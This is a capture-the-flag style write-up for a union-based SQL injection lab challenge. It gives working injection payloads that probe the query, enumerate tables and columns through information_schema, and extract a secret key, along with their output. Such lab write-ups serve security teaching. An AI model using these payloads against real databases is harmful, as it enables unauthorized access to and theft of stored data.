## Challenge - 1

In this challenge we have to dump a secret key in an unknown column in an unknown table in the database 'CHALLENGES'. This is a union based challenge and we have to get the key in less than 10 attempts

references :

 http://www.securitytube.net/video/4210

http://www.securitytube.net/video/4208

### Initial Analysis

First we have to find out how the developer has given the query so we try giving id the value

```sql
0' or 1=1 --+ 
```

which gives us a login name and a password.

To make sure it is correct we try with id=

```sql
0" or 1=1 --+
```

which outputs nothing. So the query must be like

```sql
select login_name,password from table_name where id='input' 
```

we still don't know the table name or the column names.

now as we know the query structure we can try union by giving: id=

```sql
0' union select 1,2,3 --+
```

which gives us

```
Your Login name:2
Your Password:3
```

to recheck we try giving values

```sql
0' union select 1,4,5 --+
```

and as expected we get

```
Your Login name:4
Your Password:5
```

So this query will dump anything we give in the place of 2 and 3. 

We can use the same method to dump table_name,column_name and secret key

### Solving

Now we can find the table name using

```sql
0' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='CHALLENGES'; --+
```

which gives us the table name :

**usauc12dne**

Now we can find the columns in the table using 

```sql
0' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='usauc12dne' and table_schema='CHALLENGES'; --+
```

we get 4 column names:

**id,sessid,secret_UORS,tryy**

The secret key can be in any of these columns but we can always go for the most suspicious one and print the secret key using:

```sql
0' union select 1,2,group_concat(secret_UORS) from usauc12dne; --+
```

We get the secret key:

**hcZo9W8NUjESrCoWaEyyyoV6**

